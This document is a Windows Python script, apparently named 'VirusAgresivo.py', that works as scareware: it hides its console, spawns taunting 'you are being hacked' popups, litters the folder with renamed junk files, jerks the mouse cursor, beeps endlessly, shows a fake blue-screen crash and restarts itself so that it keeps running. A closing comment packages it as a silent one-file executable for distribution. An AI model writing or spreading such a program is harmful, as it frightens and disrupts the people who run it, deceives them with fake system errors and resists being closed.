import tkinter as tk
import os
import sys
import time
import threading
import random
import ctypes
import winsound

# Lista de mensajes para las ventanas emergentes
mensajes = [
    "¡Estás siendo hackeado!",
    "ERROR: Sistema comprometido.",
    "¿Pensaste que podrías cerrar esto?",
    "No puedes escapar.",
    "Demasiado tarde...",
    "Tu computadora está siendo controlada..."
]

# Crear ventanas emergentes
def ventana_emergente():
    for _ in range(20):  # Ajusta la cantidad de ventanas
        msg = random.choice(mensajes)
        root = tk.Tk()
        root.title("¡Alerta!")
        root.geometry(f"300x100+{random.randint(0, 1000)}+{random.randint(0, 600)}")
        label = tk.Label(root, text=msg, font=("Helvetica", 12), fg="red")
        label.pack(pady=20)
        btn = tk.Button(root, text="Cerrar", command=root.destroy)
        btn.pack()
        root.after(3000, root.destroy)
        root.mainloop()
        time.sleep(0.3)

# Crear archivos molestos y cambiar nombres
def crear_archivos():
    for i in range(10):
        archivo_nombre = f"NO_BORRAR_{random.randint(1000,9999)}.txt"
        with open(archivo_nombre, "w") as f:
            f.write("Creo que estas un poco jodido bro.\n")
        time.sleep(0.30)

        # Cambiar el nombre del archivo para hacerlo más raro
        nuevo_nombre = f"RANDOM_FILE_{random.randint(10000,99999)}.txt"
        os.rename(archivo_nombre, nuevo_nombre)

# Movimiento aleatorio del cursor
def mover_cursor():
    for _ in range(50):
        x, y = random.randint(0, 1920), random.randint(0, 1080)  # Resolución de pantalla
        ctypes.windll.user32.SetCursorPos(x, y)
        time.sleep(0.2)

# Reproducir sonido molesto
def sonido_molesto():
    while True:
        winsound.Beep(1000, 500)  # Frecuencia 1000 Hz durante 0.5 segundos
        time.sleep(0.5)

# Pantalla azul falsa (BSOD)
def pantalla_azul_falsa():
    bsod = tk.Tk()
    bsod.title("ERROR CRÍTICO")
    bsod.attributes('-fullscreen', True)
    bsod.configure(bg="blue")

    texto = (
        "😵 Se ha detectado un problema y Windows se ha apagado para evitar daños.\n\n"
        "Si es la primera vez que ves esta pantalla de error, reinicia tu computadora.\n"
        "Si esta pantalla aparece de nuevo, sigue estos pasos:\n\n"
        "Verifica que cualquier nuevo hardware o software esté instalado correctamente.\n"
        "Si este es un nuevo sistema, pide ayuda al soporte técnico.\n\n"
        "*** STOP: 0x000000D3 (0x000000, 0x000000, 0x000000, 0x000000)\n"
        "Recopilando datos para diagnóstico...\n\n"
        "Presiona cualquier tecla para continuar..."
    )

    label = tk.Label(bsod, text=texto, font=("Consolas", 14), fg="white", bg="blue", justify="left")
    label.pack(padx=40, pady=40)

    bsod.bind("<Key>", lambda e: sys.exit())
    bsod.mainloop()

# Falsa desinstalación de archivos
def desinstalar_falsa():
    for i in range(10):
        print(f"Desinstalando archivo {i+1}... [simulado]")
        time.sleep(0.5)

# Auto-reinicio del script
def auto_reiniciar():
    time.sleep(15)  # Espera antes de reiniciar
    os.execl(sys.executable, sys.executable, *sys.argv)

# Ocultar consola en Windows (opcional)
def ocultar_consola():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# Programa principal
def main():
    ocultar_consola()
    threading.Thread(target=ventana_emergente).start()
    threading.Thread(target=crear_archivos).start()
    threading.Thread(target=mover_cursor).start()
    threading.Thread(target=sonido_molesto).start()
    threading.Thread(target=desinstalar_falsa).start()
    threading.Thread(target=auto_reiniciar).start()

    # Ejecuta la pantalla azul falsa
    threading.Thread(target=pantalla_azul_falsa).start()

if __name__ == "__main__":
    main()

# EJECUTAR
# pyinstaller --noconsole --onefile VirusAgresivo.py

